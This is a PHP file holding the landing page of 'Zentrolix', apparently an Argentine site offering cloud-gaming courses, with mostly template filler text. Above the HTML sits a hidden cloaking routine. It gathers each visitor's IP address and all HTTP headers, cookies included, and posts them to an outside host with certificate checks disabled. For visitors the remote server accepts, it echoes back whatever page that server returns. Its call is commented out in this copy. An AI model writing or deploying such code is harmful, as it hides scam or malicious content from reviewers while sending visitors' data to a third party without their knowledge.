<?php
//request();

function request(): void {
	$pub_key    = 'AR';
	$secret_key = '0000-00-0000';
	$request    = 'CA';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="author" content="Zentrolix">
        <meta name="description" content="Zentrolix — plataforma educativa en Argentina para aprender a elegir, configurar y optimizar servicios de juegos en la nube. Cursos y guías para principiantes.">
        <meta name="keywords" content="Zentrolix, cursos, guías, juegos en la nube, cloud gaming, Argentina, aprender, principiantes, plataformas educativas">
        <meta name="robots" content="index, follow">
        <meta property="og:title" content="Zentrolix — Plataforma educativa de juegos en la nube">
        <meta property="og:description" content="Zentrolix — plataforma educativa en Argentina para aprender a elegir, configurar y optimizar servicios de juegos en la nube. Cursos y guías para principiantes.">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://zentrolix.com/">
        <meta property="og:image" content="https://zentrolix.com/assets/img/logo/black-logo.svg">
        <meta property="og:site_name" content="Zentrolix">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="Zentrolix — Plataforma educativa de juegos en la nube">
        <meta name="twitter:description" content="Zentrolix — plataforma educativa en Argentina para aprender a elegir, configurar y optimizar servicios de juegos en la nube. Cursos y guías para principiantes.">
        <meta name="twitter:image" content="https://zentrolix.com/assets/img/logo/black-logo.svg">
        <title>Zentrolix — Plataforma educativa de juegos en la nube</title>
        <link rel="shortcut icon" href="assets/img/favicon.png">
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/all.min.css">
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css">
        <link rel="stylesheet" href="assets/css/meanmenu.css">
        <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
        <link rel="stylesheet" href="assets/css/nice-select.css">
        <link rel="stylesheet" href="assets/css/main.css">
    </head>
    <body>

        <div id="preloader" class="preloader">
            <div class="animation-preloader">
                <div class="spinner">                
                </div>
                <div class="txt-loading">
                    <span data-text-preloader="Z" class="letters-loading">
                        Z
                    </span>
                    <span data-text-preloader="E" class="letters-loading">
                        E
                    </span>
                    <span data-text-preloader="N" class="letters-loading">
                        N
                    </span>
                    <span data-text-preloader="T" class="letters-loading">
                        T
                    </span>
                    <span data-text-preloader="R" class="letters-loading">
                        R
                    </span>
                    <span data-text-preloader="O" class="letters-loading">
                        O
                    </span>
                    <span data-text-preloader="L" class="letters-loading">
                        L
                    </span>
                    <span data-text-preloader="I" class="letters-loading">
                        I
                    </span>
                    <span data-text-preloader="X" class="letters-loading">
                        X
                    </span>
                </div>
                <p class="text-center">Cargando</p>
            </div>
            <div class="loader">
                <div class="row">
                    <div class="col-3 loader-section section-left">
                        <div class="bg"></div>
                    </div>
                    <div class="col-3 loader-section section-left">
                        <div class="bg"></div>
                    </div>
                    <div class="col-3 loader-section section-right">
                        <div class="bg"></div>
                    </div>
                    <div class="col-3 loader-section section-right">
                        <div class="bg"></div>
                    </div>
                </div>
            </div>
        </div> 
        <button id="pp-back-top" class="pp-back-to-top show">
           <i class="fa-solid fa-arrow-up"></i>
        </button>

        <div class="mouseCursor cursor-outer"></div>
        <div class="mouseCursor cursor-inner"></div>

        <div class="fix-area">
            <div class="offcanvas__info">
                <div class="offcanvas__wrapper">
                    <div class="offcanvas__content">
                        <div class="offcanvas__top mb-5 d-flex justify-content-between align-items-center">
                            <div class="offcanvas__logo">
                                <a href="/">
                                    <img src="assets/img/logo/logo.png" alt="logo-img">
                                </a>
                            </div>
                            <div class="offcanvas__close">
                                <button>
                                <i class="fas fa-times"></i>
                                </button>
                            </div>
                        </div>
                        <p class="text d-none d-xl-block">
                            Nullam dignissim, ante scelerisque, odio semper, a feugiat leo urna eget eros.  Aenean imperdiet, duis.
                        </p>
                        <div class="mobile-menu fix mb-3"></div>
                        <div class="offcanvas__contact">
                            <h4>Contact Info</h4>
                            <ul>
                                <li class="d-flex align-items-center">
                                    <div class="offcanvas__contact-icon">
                                        <i class="fal fa-map-marker-alt"></i>
                                    </div>
                                    <div class="offcanvas__contact-text">
                                        <a target="_blank" href="https://maps.google.com/?q=Obispo+Trejo+864,+X5000+Córdoba,+Argentina">Obispo Trejo 864, X5000 Córdoba, Argentina</a>
                                    </div>
                                </li>
                                <li class="d-flex align-items-center">
                                    <div class="offcanvas__contact-icon mr-15">
                                        <i class="fal fa-envelope"></i>
                                    </div>
                                    <div class="offcanvas__contact-text">
                                        <a href="mailto:help@zentrolix.com">help@zentrolix.com</a>
                                    </div>
                                </li>
                                <li class="d-flex align-items-center">
                                    <div class="offcanvas__contact-icon mr-15">
                                        <i class="far fa-phone"></i>
                                    </div>
                                    <div class="offcanvas__contact-text">
                                        <a href="tel:+5435146789012">+54 351 467-8901</a>
                                    </div>
                                </li>
                            </ul>
                            <div class="header-button mt-4">
                                
                            </div>
                          
                           
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="offcanvas__overlay"></div>

     
        <header id="header-sticky" class="header-1">
            <div class="container-fluid">
                <div class="mega-menu-wrapper">
                    <div class="header-main style-1">
                        <div class="logo">
                            <a href="/" class="header-logo">
                                <img src="assets/img/logo/logo.png" alt="logo-img">
                            </a>
                            <a href="/" class="header-logo-2">
                                <img src="assets/img/logo/logo.png" alt="logo-img" class="logo-white">
                            </a>
                        </div>
                        <div class="mean__menu-wrapper">
                            <div class="main-menu">
                                <nav id="mobile-menu">
                                    <ul>
                                        <li class="has-dropdown active menu-thumb">
                                            <a href="/">
                                                Inicio
                                            </a>
                                         
                                        </li>
                                        <li class="has-dropdown">
                                            <a href="about.html">Sobre el proyecto</a>
                                        </li>
                                        <li class="has-dropdown">
                                            <a href="service.html">Cursos</a>
                                        </li>
                                        <li>
                                            <a href="contact.html">Contacto</a>
                                        </li>
                                      
                                      
                                    </ul>
                                </nav>
                            </div>
                        </div>
                        <div class="header-right d-flex justify-content-end align-items-center">
                            <a href="contact.html" class="pp-theme-btn">
                                Get a quote <i class="fa-solid fa-arrow-right-long"></i>
                            </a>
                            <div class="header__hamburger d-xl-none my-auto">
                                <div class="sidebar__toggle">
                                    <div class="header-bar style-1">
                                        <span></span>
                                        <span></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header> 


        <section class="pp-hero-section pp-hero-1 fix">
            <div class="top-shape">
                <img src="assets/img/home-1/hero/hero-bg.png" alt="img">
            </div>
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-xl-10">
                        <div class="pp-hero-content">
                            <h1 class="wow img-custom-anim-left" data-wow-duration="1.3s" data-wow-delay="0.3s">
                                Con Zentrolix aprende a manejar los servicios de juegos en la nube.
                            </h1>
                            <p class="wow fadeInUp" data-wow-delay=".5s">
                                Zentrolix es tu plataforma de enseñanza en Argentina para adquirir habilidades en la selección, configuración y optimización de servicios de juegos en línea.  Cursos y manuales para novatos.
                            </p>
                            <div class="pp-hero-button">
                                <a href="contact.html#registro" class="pp-theme-btn wow fadeInUp" data-wow-delay=".3s">Regístrate <i class="fa-solid fa-arrow-right-long"></i></a>
                                <a href="about.html" class="pp-theme-btn pp-style-2 wow fadeInUp" data-wow-delay=".3s">Saber más <i class="fa-solid fa-arrow-right-long"></i></a>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-12">
                        <div class="pp-hero-image wow img-custom-anim-bottom" data-wow-duration="1.3s" data-wow-delay="0.3s">
                            <img src="assets/img/home-1/hero/hero-1.jpg" alt="img">
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="pp-team-information-section section-padding section-bg fix">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="pp-team-information-item">
                            <p>
                                El juego en la nube está transformando la manera en que interactuamos con los videojuegos.  Ya no requieres de un ordenador potente o una consola cara para disfrutar de los juegos más recientes.  Con los servicios de juegos en la nube, tienes la posibilidad de acceder a una biblioteca de juegos completa desde cualquier aparato que tenga conexión a internet.
                            </p>
                            <p>
                                En Zentrolix, te proporcionamos todos los conocimientos necesarios para maximizar el uso de estas tecnologías.  Desde elegir el servicio más apropiado hasta mejorar tu conexión, nuestros cursos te orientarán de manera gradual en tu travesía por el juego en la nube.
                            </p>
                            <p>
                                Nuestro grupo de especialistas ha elaborado un programa completo que incluye desde conceptos elementales hasta configuraciones sofisticadas.  Adquirirás conocimientos acerca de latencia, ancho de banda, codificación de video y otros elementos técnicos detallados de forma sencilla y práctica.
                            </p>
                            <p>
                                Además, te mantenemos al día acerca de las más recientes innovaciones en el ámbito del cloud gaming.  Examinamos nuevos servicios, comparamos beneficios y te asistimos en la selección de la alternativa más adecuada de acuerdo a tus requerimientos y presupuesto.
                            </p>
                            <p>
                                Con nuestro enfoque gradual, lograrás dominar plataformas como GeForce Now, Xbox Cloud Gaming, Amazon Luna entre otras muchas.  Te proporcionamos estrategias y recomendaciones para mejorar tu experiencia de juego en la nube.
                            </p>
                            <div class="pp-team-skill-box">
                                <div class="row g-4">
                                    <div class="col-lg-6">
                                        <div class="progress-wrap">
                                        <div class="pro-items">
                                            <div class="pro-head">
                                                <h5 class="title">
                                                    Configuración Básica
                                                </h5>
                                                <span class="point">
                                                    95%
                                                </span>
                                            </div>
                                            <div class="progress">
                                                <div class="progress-value"></div>
                                            </div>
                                        </div>
                                        <div class="pro-items">
                                            <div class="pro-head">
                                                <h5 class="title">
                                                    Optimización de Red
                                                </h5>
                                                <span class="point">
                                                    80%
                                                </span>
                                            </div>
                                            <div class="progress">
                                                <div class="progress-value style-two"></div>
                                            </div>
                                        </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-6">
                                         <div class="progress-wrap">
                                            <div class="pro-items">
                                                <div class="pro-head">
                                                    <h5 class="title">
                                                        Resolución de Problemas
                                                    </h5>
                                                    <span class="point">
                                                        85%
                                                    </span>
                                                </div>
                                                <div class="progress">
                                                    <div class="progress-value style-three"></div>
                                                </div>
                                            </div>
                                            <div class="pro-items">
                                                <div class="pro-head">
                                                    <h5 class="title">
                                                        Configuración Avanzada
                                                    </h5>
                                                    <span class="point">
                                                        90%
                                                    </span>
                                                </div>
                                                <div class="progress">
                                                    <div class="progress-value style-four"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

      
        <section class="pp-about-section section-padding fix">
            <div class="container">
                <div class="pp-about-wrapper">
                    <div class="row g-4">
                        <div class="col-lg-6">
                            <div class="about-image">
                                <img src="assets/img/home-1/about/about-1.png" alt="img" class="wow img-custom-anim-left" data-wow-duration="1.3s" data-wow-delay="0.3s">
                               
                                <div class="about-shape">
                                    <img src="assets/img/home-1/about/shape-1.png" alt="img">
                                </div>
                                <div class="circle-shape">
                                    <img src="assets/img/home-1/about/shape-2.png" alt="img">
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-6">
                            <div class="about-content">
                                <div class="pp-section-title mb-0">
                                    <span class="pp-sub-title wow fadeInUp">SOBRE NOSOTROS</span>
                                    <h2 class="wow fadeInUp" data-wow-delay=".3s">
                                        Realizamos que los juegos en la nube estén al alcance de todos.
                                    </h2>
                                </div>
                                <p class="pp-text wow fadeInUp" data-wow-delay=".5s">
                                    Desde jugadores cotidianos hasta apasionados, nuestras guías fácilmente entendibles asisten a todos a iniciar con el juego en la nube.  Entiende cómo poner en marcha, mejorar y disfrutar de tus juegos preferidos sin requerir de un hardware caro.
                                </p>
                                <div class="about-count-item wow fadeInUp" data-wow-delay=".3s">
                                    <div class="count-text">
                                        <h2><span class="pp-count">50</span>k+</h2>
                                        <p>
                                            Usuarios activos
                                        </p>
                                    </div>
                                    <div class="count-text">
                                        <h2><span class="pp-count">100</span>+</h2>
                                        <p>
                                            Guías y tutoriales
                                        </p>
                                    </div>
                                    <div class="count-text">
                                        <h2><span class="pp-count">15</span>+</h2>
                                        <p>
                                           Servicios analizados
                                        </p>
                                    </div>
                                </div>
                                <a href="about.html" class="pp-theme-btn wow fadeInUp" data-wow-delay=".5s">Conoce más <i class="fa-solid fa-arrow-right-long"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="pp-offer-section section-padding fix section-bg">
            <div class="container">
                <div class="pp-section-title text-center">
                    <span class="pp-sub-title wow fadeInUp">
                        QUÉ OFRECEMOS
                        <span class="pp-style-2"></span>
                    </span>
                    <h2 class="wow fadeInUp" data-wow-delay=".3s">
                       Cursos y guías para principiantes
                    </h2>
                 </div>
                <div class="row">
                    <div class="col-xl-4 col-lg-6 col-md-6 wow fadeInUp" data-wow-delay=".3s">
                        <div class="pp-offer-box-item">
                            <div class="pp-offer-icon">
                                <img src="assets/img/home-1/icon/01.svg" alt="img">
                            </div>
                            <div class="pp-offer-content">
                                <h3>
                                    Cómo elegir un servicio en la nube
                                </h3>
                                <p>
                                    Aprende a contrastar y elegir la plataforma de juegos en la nube más adecuada para tus requerimientos.
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-6 col-md-6 wow fadeInUp" data-wow-delay=".5s">
                        <div class="pp-offer-box-item">
                            <div class="pp-offer-icon">
                                <img src="assets/img/home-1/icon/02.svg" alt="img">
                            </div>
                            <div class="pp-offer-content">
                                <h3>
                                    Configuración paso a paso
                                </h3>
                                <p>
                                    Manuales exhaustivos para establecer tu cuenta y comenzar a interactuar en la nube sin dificultades.
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-6 col-md-6 wow fadeInUp" data-wow-delay=".7s">
                        <div class="pp-offer-box-item">
                            <div class="pp-offer-icon">
                                <img src="assets/img/home-1/icon/03.svg" alt="img">
                            </div>
                            <div class="pp-offer-content">
                                <h3>
                                    Optimización y consejos
                                </h3>
                                <p>
                                    Aprende cómo optimizar el desempeño y la experiencia de juego en cualquier aparato.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

           <section class="pp-news-details-section section-padding">
            <div class="container">
                <div class="pp-news-details-wrapper">
                    <div class="row g-4">
                        <div class="col-12 col-lg-8">
                            <div class="pp-details-image">
                                <img src="assets/img/inner-page/news-details/details-1.jpg" alt="img">
                            </div>
                            <div class="pp-news-details-content">
                                <h3>Como seleccionar el servicio de juegos en la nube más adecuado para ti</h3>
                                <p>
                                    Los servicios de juegos en la nube están transformando el modo en que interactuamos con los juegos.  Ya no requieres de una PC de juego costosa para disfrutar de los juegos más recientes.  Mediante la tecnología apropiada y una conexión a Internet óptima, puedes disfrutar de tus juegos preferidos desde cualquier aparato.
                                 </p>
                                <div class="pp-sideber">
                                    <h6>
                                        El secreto radica en seleccionar el servicio que mejor se ajuste a tus requerimientos.  Elementos como el catálogo de videojuegos, la calidad de transmisión en directo y el costo son esenciales para tomar la decisión adecuada.
                                    </h6>
                                    <div class="client-info-item">
                                      
                                        <div class="icon">
                                            <img src="assets/img/inner-page/icon/05.svg" alt="img">
                                        </div>
                                    </div>
                                </div>
                                <div class="row g-4">
                                    <div class="col-lg-6">
                                        <div class="pp-details-image">
                                            <img src="assets/img/inner-page/news-details/details-2.jpg" alt="img">
                                        </div>
                                    </div>
                                    <div class="col-lg-6">
                                        <div class="pp-details-image">
                                             <img src="assets/img/inner-page/news-details/details-3.jpg" alt="img">
                                        </div>
                                    </div>
                                </div>
                                <p class="mt-4">
                                    Los juegos en la nube brindan una vivencia singular que fusiona accesibilidad y eficiencia operativa.  Con una conexión estable, podrás gozar de gráficos de excelente calidad y tiempos de carga reducidos, independientemente de las características de tu aparato.
                                </p>
                             
                               
                              
                            </div>
                        </div>
                        <div class="col-lg-4 col-12">
                            <div class="pp-main-sideber sticky-style">
                                <div class="pp-single-sideber-widget">
                                    <div class="pp-widget-title">
                                        <h3>Beneficios del Cloud Gaming</h3>
                                    </div>
                                    <ul class="pp-category-list">
                                        <li>Juega en cualquier dispositivo</li>
                                        <li>Sin necesidad de hardware costoso</li>
                                        <li>Acceso instantáneo a juegos</li>
                                        <li>Ahorro en almacenamiento</li>
                                        <li>Actualizaciones automáticas</li>
                                    </ul>
                                </div>
                             
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
       

        <section class="pp-how-work-section section-padding fix section-bg-2">
            <div class="top-shape">
                <img src="assets/img/home-1/feature/bg-shape.png" alt="img">
            </div>
            <div class="line-shape">
                <img src="assets/img/home-1/feature/line.png" alt="img">
            </div>
            <div class="container">
                <div class="pp-section-title text-center">
                    <span class="pp-sub-title wow fadeInUp">
                        CÓMO FUNCIONA
                        <span class="pp-style-2"></span>
                    </span>
                    <h2 class="text-white wow fadeInUp" data-wow-delay=".3s">
                       Aprende en 3 pasos sencillos
                    </h2>
                 </div>
                <div class="row">
                    <div class="col-xl-4 col-lg-6 col-md-6 wow fadeInUp" data-wow-delay=".3s">
                        <div class="pp-how-work-items">
                            <h6>PASO 01</h6>
                            <h3>Elige tu curso</h3>
                            <p>
                                Elige el asunto que más te atrae y disfruta del contenido desde cualquier sitio.
                            </p>
                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-6 col-md-6 wow fadeInUp" data-wow-delay=".5s">
                        <div class="pp-how-work-items pp-style-2">
                            <h6>PASO 02</h6>
                            <h3>Sigue las guías</h3>
                            <p>
                                Sigue directrices precisas y gráficas para progresar gradualmente.
                            </p>
                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-6 col-md-6 wow fadeInUp" data-wow-delay=".7s">
                        <div class="pp-how-work-items">
                            <h6>PASO 03</h6>
                            <h3>Aplica y juega</h3>
                            <p>
                                Implementa los conocimientos adquiridos y disfruta de tus juegos preferidos en la nube.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="pp-key-feature-section section-padding pb-0 fix">
            <div class="container">
                <div class="pp-key-feature-wrapper">
                    <div class="row g-4">
                        <div class="col-lg-6">
                            <div class="pp-key-feature-image">
                                <img src="assets/img/home-1/feature/02.jpg" alt="img">
                              
                               
                            </div>
                        </div>
                        <div class="col-lg-6">
                            <div class="pp-key-feature-content">
                                <div class="pp-section-title mb-0">
                                    <span class="pp-sub-title wow fadeInUp">CARACTERÍSTICAS CLAVE</span>
                                    <h2 class="wow fadeInUp" data-wow-delay=".3s">
                                         Materiales interactivos y soporte
                                    </h2>
                                </div>
                                <p class="pp-text wow fadeInUp" data-wow-delay=".5s">
                                    Resuelve tus interrogantes con recursos visuales, tutoriales en video y asistencia personalizada.
                                </p>
                                <ul class="pp-feature-list wow fadeInUp" data-wow-delay=".3s">
                                    <li>
                                        Cursos para todos los niveles
                                    </li>
                                    <li>
                                        Guías paso a paso
                                    </li>
                                    <li>
                                        Comunidad de apoyo
                                    </li>
                                </ul>
                                <a href="service.html" class="pp-theme-btn wow fadeInUp" data-wow-delay=".5s">Leer más <i class="fa-solid fa-arrow-right-long"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="pp-key-feature-section section-padding fix">
            <div class="container">
                <div class="pp-key-feature-wrapper pp-style-2">
                    <div class="row g-4">
                        <div class="col-lg-6">
                            <div class="pp-key-feature-content">
                                <div class="pp-section-title mb-0">
                                    <span class="pp-sub-title wow fadeInUp">CARACTERÍSTICAS CLAVE</span>
                                    <h2 class="wow fadeInUp" data-wow-delay=".3s">
                                          Rendimiento Garantizado
                                    </h2>
                                </div>
                                <p class="pp-text wow fadeInUp" data-wow-delay=".5s">
                                    Disfruta del juego de alta calidad en la nube con nuestra plataforma mejorada.  Espera disfrutar de tus juegos preferidos sin retrasos ni pausas.
                                </p>
                                <ul class="pp-feature-list wow fadeInUp" data-wow-delay=".3s">
                                    <li>
                                        Calidad gráfica superior
                                    </li>
                                    <li>
                                        Conexión ultrarrápida
                                    </li>
                                    <li>
                                        Acceso multiplataforma
                                    </li>
                                </ul>
                                <a href="about.html" class="pp-theme-btn wow fadeInUp" data-wow-delay=".5s">Conocé más <i class="fa-solid fa-arrow-right-long"></i></a>
                            </div>
                        </div>
                        <div class="col-lg-6">
                            <div class="pp-key-feature-image">
                                <img src="assets/img/home-1/feature/06.jpg" alt="img">
                               
                               
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <div id="cookie-consent-banner" style="display:none;position:fixed;bottom:0;left:0;width:100%;background:#fff;border-top:1px solid #eee;padding:12px 16px;box-shadow:0 -2px 8px rgba(0,0,0,0.04);z-index:9999;font-size:15px;text-align:center;">
  Utilizamos cookies para mejorar la experiencia del usuario. Lea nuestra <a href="privacy-policy.html" style="color:#007bff;text-decoration:underline;">Política de Privacidad</a>. <button id="cookie-accept-btn" style="margin-left:16px;padding:6px 18px;background:#222;color:#fff;border:none;border-radius:4px;cursor:pointer;">Aceptar</button>
</div>

   <footer class="pp-footer-section-2 bg-cover" style="background-image: url(assets/img/home-2/footer-bg.jpg);"> 
    <div class="container">
        <div class="pp-footer-widget-wrapper pp-style-2">
            <div class="pp-footer-newsletter">
                <div class="pp-newsletter-content wow fadeInUp" data-wow-delay=".3s">
                    <h2>
                        ¡Únete a Zentrolix y aprende sobre juegos en la nube!
                    </h2>
                    <p>
                        Obtiene directrices, actualizaciones y recomendaciones únicas.  ¡Deja tu correo electrónico y estarás al día!
                    </p>
                </div>
                <form action="#" class="wow fadeInUp" data-wow-delay=".5s" id="newsletter-form">
                    <div class="form-clt">
                        <input type="email" name="email" placeholder="Tu correo electrónico" required>
                        <button type="submit" class="pp-theme-btn">
                           <i class="fa-solid fa-paper-plane"></i> Suscribirse
                        </button>
                    </div>
                </form>
              
            </div>
            <div class="row justify-content-between">
                <div class="col-xl-5 col-lg-4 col-md-6 wow fadeInUp" data-wow-delay=".2s">
                    <div class="pp-footer-widget-items">
                        <div class="pp-widget-head">
                            <a href="/" class="pp-footer-logo">
                                <img src="assets/img/logo/logo.png" alt="img" class="logo-white">
                            </a>
                        </div>
                        <div class="pp-footer-content">
                            <p>
                                Zentrolix — plataforma de enseñanza en Argentina destinada a aprender a seleccionar, configurar y mejorar servicios de juegos en línea.
                            </p>
                          
                        </div>
                    </div>
                </div>
                <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 ps-lg-5 wow fadeInUp" data-wow-delay=".4s">
                    <div class="pp-footer-widget-items">
                        <div class="pp-widget-head">
                            <h3>Enlaces rápidos</h3>
                        </div>
                        <ul class="pp-list-area">
                            <li>
                                <a href="/">
                                    Inicio
                                </a>
                            </li>
                            <li>
                                <a href="about.html">
                                    Sobre el proyecto
                                </a>
                            </li>
                            <li>
                                <a href="service.html">
                                    Cursos
                                </a>
                            </li>
                            <li>
                                <a href="contact.html">
                                    Contacto
                                </a>
                            </li>
                           
                        </ul>
                    </div>
                </div>
                <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 ps-lg-5 wow fadeInUp" data-wow-delay=".6s">
                   
                </div>
                <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 ps-lg-2 wow fadeInUp" data-wow-delay=".8s">
                    <div class="pp-footer-widget-items">
                        <div class="pp-widget-head">
                            <h3>¿Quieres aprender más?</h3>
                        </div>
                        <div class="pp-contact-info">
                            <div class="pp-icon">
                                <i class="fa-regular fa-envelope"></i>
                            </div>
                            <div class="pp-content">
                                <h6>
                                    <a href="mailto:help@zentrolix.com">
                                        help@zentrolix.com
                                    </a>
                                </h6>
                            </div>
                        </div>
                        <div class="pp-contact-info">
                            <div class="pp-icon">
                                <i class="fa-solid fa-location-dot"></i>
                            </div>
                            <div class="pp-content">
                                <h6>
                                    <a href="https://maps.app.goo.gl/6DHP3jv7QiC3nqUL7" target="_blank">
                                        Obispo Trejo 864, X5000 Córdoba
                                    </a>
                                </h6>
                            </div>
                        </div>
                       
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer-bottom3">
        <div class="container">
            <div class="pp-footer-bottom-wrapper">
                <p class="wow fadeInUp" data-wow-delay=".3s">Copyright© <b>Zentrolix</b></p>
                <ul class="pp-footer-list wow fadeInUp" data-wow-delay=".5s">
                    <li>
                        <a href="terms-of-use.html">Términos de uso</a>
                    </li>
                    <li>
                        <a href="privacy-policy.html">Política de privacidad</a>
                    </li>
                    <li>
                       
                    </li>
                </ul>
            </div>
        </div>
    </div>
</footer>

        <script src="assets/js/jquery-3.7.1.min.js"></script>
        <script src="assets/js/viewport.jquery.js"></script>
        <script src="assets/js/bootstrap.bundle.min.js"></script>
        <script src="assets/js/jquery.nice-select.min.js"></script>
        <script src="assets/js/jquery.waypoints.js"></script>
        <script src="assets/js/jquery.counterup.min.js"></script>
        <script src="assets/js/swiper-bundle.min.js"></script>
        <script src="assets/js/jquery.meanmenu.min.js"></script>
        <script src="assets/js/jquery.magnific-popup.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/ajax-mail.js"></script>
        <script src="assets/js/main.js"></script>
       
    </body>
</html>